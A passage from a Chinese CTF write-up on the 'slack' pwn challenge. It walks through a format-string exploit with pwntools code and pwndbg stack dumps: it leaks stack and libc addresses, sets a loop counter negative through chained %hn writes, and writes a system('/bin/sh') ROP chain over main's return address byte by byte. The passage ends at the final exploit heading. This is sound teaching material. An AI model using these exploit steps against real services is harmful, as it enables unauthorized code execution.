
```python
# step1: leak stack/libc
sla(b"): ", "%1$p %9$p")
ru("You: ")
data = rl().strip().decode().split()
some\_stack\_addr = data[0]
some\_libc\_addr = data[1]
logsucc("some\_stack\_addr = " + some\_stack\_addr)
logsucc("some\_libc\_addr = " + some\_libc\_addr)
main\_ret\_addr = int(some\_stack\_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190)
libc\_base\_addr = int(some\_libc\_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0)
libc.address = libc\_base\_addr
leak("main\_ret\_addr", main\_ret\_addr)
leak("libc\_base\_addr", libc\_base\_addr)
dbg()
itr()
```

![image-20230715021938323](upload/attach/202402/830671_347TB42URYDJR5M.jpg)

### 5.3.2 修改变量`i`的值为一个大负数

还有两次触发机会。接下来需要把一个`rop`链的地址写到`main_ret_addr`里，也就是要把一个大数（8字节）写入到某个地址，那这需要一个字节一个字节写。还是那个问题，输入长度有限，不能一次性写长的`payload`，而现在触发`printf`的机会也只剩两次了。那可以修改局部变量`i`为一个负数来增加循环次数，从而增加触发`printf`的机会。

要覆写`i`为一个负数，首先来看一下`i`的地址：

```c
int i; // [rsp+8h] [rbp-68h]
```

那么泄露`i`的地址：

```python
# step2: set i to some negative number
i\_addr = main\_ret\_addr - (0x68+8)
leak("i\_addr", i\_addr)
```

结果如下：

```shell
root@8edd47208f9e:/chal# python3 exp.py
......
[+] i\_addr = 0x7fff1d91b458
```

对于整型变量`i`来说，其内容为4个字节，

```shell
00 00 00 01
addr+3 addr
```

要将其值变成负数，最简单的方法就是把最高的一个字节变成`0xff`（256）。

```
(i\_addr+3) + "%kc%j$hhn"
8Byte 最少9Byte
```

很明显，输入空间不足以支撑。需要另想办法，如下图。

![image-20230715171949130](upload/attach/202402/830671_2ZDMUQ2BPBWUUUV.jpg)

一步一步来，先来看看循环第二次时，`call printf`时栈的情况：

```shell
root@8edd47208f9e:/chal# gdb slack
......
pwndbg> b \*main+402
Breakpoint 1 at 0x145b
pwndbg> r
......
pwndbg> stack 50
00:0000│ rsp 0x7ffe27708e20 ◂— 0x0
01:0008│ 0x7ffe27708e28 ◂— 0x1 <--- 这个是变量i
02:0010│ 0x7ffe27708e30 ◂— 0x64b26afd
03:0018│ 0x7ffe27708e38 —▸ 0x7ff6be6e56a0 (\_tmbuf) ◂— 0x2e00000025 /\* '%' \*/
04:0020│ 0x7ffe27708e40 ◂— '2023-07-15 09:46:37'
05:0028│ 0x7ffe27708e48 ◂— '15 09:46:37'
06:0030│ 0x7ffe27708e50 ◂— 0x37333a /\* ':37' \*/
07:0038│ 0x7ffe27708e58 ◂— 0x0
08:0040│ rdi 0x7ffe27708e60 ◂— 'BBBBBBBB\n'
09:0048│ 0x7ffe27708e68 ◂— 0xa /\* '\n' \*/
0a:0050│ 0x7ffe27708e70 ◂— 0x0
... ↓ 2 skipped
0d:0068│ 0x7ffe27708e88 ◂— 0x1109c51ee9704900
0e:0070│ rbp 0x7ffe27708e90 ◂— 0x1
0f:0078│ 0x7ffe27708e98 —▸ 0x7ff6be4eed90 (\_\_libc\_start\_call\_main+128) ◂— mov edi, eax
10:0080│ 0x7ffe27708ea0 ◂— 0x0
11:0088│ 0x7ffe27708ea8 —▸ 0x55e4931932c9 (main) ◂— endbr64
12:0090│ 0x7ffe27708eb0 ◂— 0x100000000
13:0098│ 0x7ffe27708eb8 —▸ 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'<---[1]这个，它指向下面的内存[2]
14:00a0│ 0x7ffe27708ec0 ◂— 0x0
15:00a8│ 0x7ffe27708ec8 ◂— 0xba423f3e3c4e0a1f
16:00b0│ 0x7ffe27708ed0 —▸ 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'<---或者这个
17:00b8│ 0x7ffe27708ed8 —▸ 0x55e4931932c9 (main) ◂— endbr64
18:00c0│ 0x7ffe27708ee0 —▸ 0x55e493195d60 (\_\_do\_global\_dtors\_aux\_fini\_array\_entry) —▸ 0x55e493193280 (\_\_do\_global\_dtors\_aux) ◂— endbr64
19:00c8│ 0x7ffe27708ee8 —▸ 0x7ff6be72e040 (\_rtld\_global) —▸ 0x7ff6be72f2e0 —▸ 0x55e493192000 ◂— 0x10102464c457f
1a:00d0│ 0x7ffe27708ef0 ◂— 0x45be71df210c0a1f
1b:00d8│ 0x7ffe27708ef8 ◂— 0x45af43a3e6c40a1f
1c:00e0│ 0x7ffe27708f00 ◂— 0x7ff600000000
1d:00e8│ 0x7ffe27708f08 ◂— 0x0
... ↓ 3 skipped
21:0108│ 0x7ffe27708f28 ◂— 0x1109c51ee9704900
22:0110│ 0x7ffe27708f30 ◂— 0x0
23:0118│ 0x7ffe27708f38 —▸ 0x7ff6be4eee40 (\_\_libc\_start\_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
24:0120│ 0x7ffe27708f40 —▸ 0x7ffe27708fb8 —▸ 0x7ffe2770a8e9 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
25:0128│ 0x7ffe27708f48 —▸ 0x55e493195d60 (\_\_do\_global\_dtors\_aux\_fini\_array\_entry) —▸ 0x55e493193280 (\_\_do\_global\_dtors\_aux) ◂— endbr64
26:0130│ 0x7ffe27708f50 —▸ 0x7ff6be72f2e0 —▸ 0x55e493192000 ◂— 0x10102464c457f
27:0138│ 0x7ffe27708f58 ◂— 0x0
28:0140│ 0x7ffe27708f60 ◂— 0x0
29:0148│ 0x7ffe27708f68 —▸ 0x55e4931931e0 (\_start) ◂— endbr64
2a:0150│ 0x7ffe27708f70 —▸ 0x7ffe27708fa0 ◂— 0x1
2b:0158│ 0x7ffe27708f78 ◂— 0x0
2c:0160│ 0x7ffe27708f80 ◂— 0x0
2d:0168│ 0x7ffe27708f88 —▸ 0x55e493193205 (\_start+37) ◂— hlt
2e:0170│ 0x7ffe27708f90 —▸ 0x7ffe27708f98 ◂— 0x1c
2f:0178│ 0x7ffe27708f98 ◂— 0x1c
30:0180│ 0x7ffe27708fa0 ◂— 0x1
31:0188│ r12 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack' <---[2]修改其值，让他指向变量i
```

因为上面`stack`命令的结果中，序号是从0开始的，所以，选择的第一个地址的偏移是 `0x13+1+5=25`，第二个地址的偏移是`0x31+1+5=55`：

```
------------------ 0x7ffe27708e28
01 i 【2】"%255c%55$hn" ：修改i的最高一个字节为0xff
------------------
......
------------------ 0x7ffe27708eb8
25 0x7ffe27708fa8
------------------
......
------------------0x7ffe27708fa8
55 0x7ffe2770a8dd 【1】f"%{(i\_addr + 3) & 0xffff}c%25$hn" ：将0x7ffe2770a8dd变成0x7ffe27708e2B
```

> 为什么`%25$hn`改变的是`0x7ffe2770a8dd`，而不是`0x7ffe27708fa8`？
>
> 因为`%n`对应的参数是个地址，比如：`printf("testtest %n\n", &c);`
>
> 这里`%n`对应的参数就是`&c`，而上面的例子中，对应的参数就是`0x7ffe27708fa8`，改变的内容自然就是`0x7ffe2770a8dd`了。

对应脚本如下：

```python
# step2: set i to some negative number
i\_addr = main\_ret\_addr - (0x68+8)
leak("i\_addr", i\_addr)
#dbg()
print(f"%{hex(i\_addr + 3)}") # 变量i最高一个字节的地址
print(f"%{hex((i\_addr + 3) & 0xffff)}") # 变量i最高一个字节的地址的最低2字节
sa(b"): ", f"%{(i\_addr + 3) & 0xffff}c%25$hn") # 将这两字节写入到栈上某个值，令这个值变成 变量i的地址
sla(b"): ", b"%255c%55$hn") # 将0xff写入到变量i内容的最高1字节
# dbg()
itr()
```

结果如下，确实变成了一个绝对值很大的负数：

![image-20230715181948314](upload/attach/202402/830671_Z6AFQ8TPXGBMRRR.jpg)

### 5.3.3 覆写`main_ret`为`rop`链

同样因为输入长度限制的原因，覆写`main_ret`的方法和覆写`i`的方法一样：

```python
# step3: overwrite return address with rop
rop = ROP(libc)
rop.raw(rop.find\_gadget(["ret"]))
rop.system(next(libc.search(b"/bin/sh")))
chain = rop.chain() # 构造rop链
# print("=======")
# print(rop.dump())
# one\_gadget = libc.address + 0x50A37
# print(f"{hex(one\_gadget)=}")
for i in range(len(rop.chain())):
payload = chain[i]
out = f"%{(main\_ret\_addr + i) & 0xffff}c%25$hn"
print(f"{i=} {out=}")
sa(b"): ", out.encode()) #修改offset=55处的内容为ret地址
if payload == 0:
out = f"%55$hhn"
print(f"{i=} {out=}")
else:
out = f"%{payload}c%55$hhn"
print(f"{i=} {out=}")
sla(b"): ", out) # 一字节一字节地覆写ret
sa(b"): ", f"%{(i\_addr + 3) & 0xffff}c%25$hn")
sla(b"): ", b"%55$hhn") # 把i改回来，不然会卡在循环里
itr()
```

## 5.4 exp
